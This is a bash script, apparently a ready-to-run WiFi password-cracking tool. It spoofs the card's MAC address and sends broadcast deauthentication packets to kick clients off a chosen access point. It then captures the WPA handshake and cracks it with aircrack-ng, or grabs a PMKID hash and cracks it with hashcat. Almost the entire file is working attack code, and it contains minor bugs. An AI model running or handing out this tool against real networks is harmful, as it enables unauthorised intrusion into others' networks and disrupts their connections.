#!/bin/bash

#Colors
end="\033[0m\e[0m"
bred="\e[0;31m\033[1m"
byellow="\e[0;33m\033[1m"
bgreen="\e[0;32m\033[1m"
bblue="\e[0;34m\033[1m"
bpurple="\e[0;35m\033[1m"
bcyan="\e[0;36m\033[1m"
bgray="\e[0;37m\033[1m"
bwhite="\033[39m\033[1m"
bblack="\033[30m\033[1m"

export DEBIAN_FRONTEND=noninteractive

##############
## CTRL + C ##
##############
trap ctrl_c INT
function ctrl_c(){
	echo -e "\n${bwhite}[*]${end}${bblue} Ending${end}"
	tput cnorm
	airmon-ng stop ${network_card}mon > /dev/null 2>&1
	rm Captura* 2>/dev/null
	exit
}

################
## HELP PANEL ##
################
function help_panel(){
	echo -e "\n${bwhite}[*]${end}${bblue} Use: $0 ${end}${bpurple}-a${end}${bcyan} attack_mode${end}${bpurple} -n${end}${bcyan} network_card${end}"
	echo -e "\n\t${bpurple}-a${end}${bcyan} attack_mode${end}"
	echo -e "\t\t${byellow}Handshake${end}"
	echo -e "\t\t${byellow}PKMID${end}"
	echo -e "\t${bpurple}-n${end}${bcyan} network_card${end}"
	echo -e "\t${bpurple}-h${end}${bcyan} help_panel${end}\n"
}

##################
## DEPENDENCIES ##
##################
function dependencies(){
	tput civis
	clear
	dependencies=(aircrack-ng macchanger)
	echo -e "${bgreen}[*]${end}${bwhite} Checking software required${end}${bblue}...${end}"
	sleep 2
	for programme in "${dependencies[@]}"; do
		echo -ne "\n${bgreen}[*]${end}${bwhite} Tool${end}${cyan} $programme${end}${bblue}...${end}"
		test -f /usr/bin/$programme
		if [ "$(echo $?)" == "0" ]; then
			echo -e " ${bgreen}(INSTALLED)${end}"
		else
			echo -e " ${bred}(NOT INSTALLED)${end}\n"
			echo -e "${bgreen}[*]${end}${bwhite} Installing tool${end}${cyan} $programme${end}${bblue}...${end}"
			wait apt-get install $programme -y > /dev/null 2>&1
		fi
		sleep 2
	done
}

############
## ATTACK ##
############
function attack(){
		clear
		echo -e "${bgreen}[*]${end}${bwhite} Setting network card${end}${bblue}...${end}\n"
		airmon-ng start $network_card > /dev/null 2>&1
		ifconfig ${network_card}mon down
		macchanger -a ${network_card}mon > /dev/null 2>&1
		ifconfig ${network_card}mon up
		killall dhclient wpa_supplicant 2>/dev/null
		echo -e "${bgreen}[*]${end}${bwhite} New MAC address asigned ${end}${bpurple}$(macchanger -s ${network_card}mon | grep -i current | xargs | cut -d ' ' -f '3-100')${end}"
		echo -ne "\n${byellow}Dictionary path for attack: ${end}" && read dicc_path
	## HANDSHAKE
	if [ "$(echo $attack_mode)" == "Handshake" ]; then

		## NETWORKS DISPLAY
		xterm -hold -e "airodump-ng ${network_card}mon" &
		dump_PID=$!
		echo -ne "\n${bgreen}[*]${end}${bwhite} Access point name: ${end}" && read ap_name
		echo -ne "\n${bgreen}[*]${end}${bwhite} Access point channel: ${end}" && read ap_channel
		kill -9 $dump_PID
		wait $dump_PID 2>/dev/null

		## FILTER
		xterm -hold -e "airodump-ng -c $ap_channel -w Screenshot --essid $ap_name ${network_card}mon" &
		dump_filter_PID=$!

		## PACKET SENDING
		sleep 5
		xterm -hold -e "aireplay-ng -0 10 -e $ap_name -c FF:FF:FF:FF:FF:FF ${network_card}mon" &
		eplay_PID=$!
		sleep 10; kill -9 $eplay_PID
		wait $eplay_PID 2>/dev/null
		sleep 3; kill -9 $dump_filter_PID
		wait $dump_filter_PID 2>/dev/null

		## MAIN ATTACK
		xterm -hold -e "aircrack-ng -w $dicc_path Screenshot-01.cap" &

## PKMID
	elif [ "$(echo $attack_mode)" == "PKMID" ]; then
		clear
		echo -e "{bgreen}[*]${end}${bwhite} Initializing ClientLess PKMID Attack${end}${bblue}...${end}\n"
		timeout 60 bash -c "hcxdumptool -i ${network_card}mon --enable_status-1 -o Screenshot"
		echo -e "\n\n${bgreen}[*]${end}${bwhite} Obtaining hashes${end}${bblue}...${end}"
		sleep 2
		hcxpcaptool -z my_hashes Screenshot; rm Screenshot* 2>/dev/null
		test -f my_hashes
		if [ "$(echo $?)" == "0" ]; then
			echo -e "\n${bgreen}[*]${end}${bwhite} Initializing attack${end}${bwhite}...${end}\n"
			sleep 2
			hashcat -m 16800 $dicc_path my_hashes -d 1 --force
		else
			echo -e "\n${red}[!] Packet not found${end}\n"
			sleep 2
		fi
	else
		echo -e "\n${bred}[!] Attack mode not valid${end}\n"
	fi
}

##########
## MAIN ##
##########
if [ "$(id -u)" == "0" ]; then
	declare -i parameter_counter=0; while getopts ":a:n:h:" arg; do # getopts establece unos parametros y podremos poner argumentos para cada ellos
		case $arg in
			a) attack_mode=$OPTARG; let parameter_counter+=1 ;; # #OPTARG guarda el argumento que viene despues de -e cuando ejecutamos el script
			n) network_card=$OPTARG; let parameter_counter+=1 ;;
			h) help_panel;;
		esac
	done

	if [ $parameter_counter -ne 2 ]; then
		help_panel
	else
		dependencies
		attack
		tput cnorm
		airmon-ng stop ${network_card}mon > /dev/null 2>&1
		rm Screenshot* 2>/dev/null
	fi
else
	echo -e "\n${bred}[!] Not root${end}\n"
fi
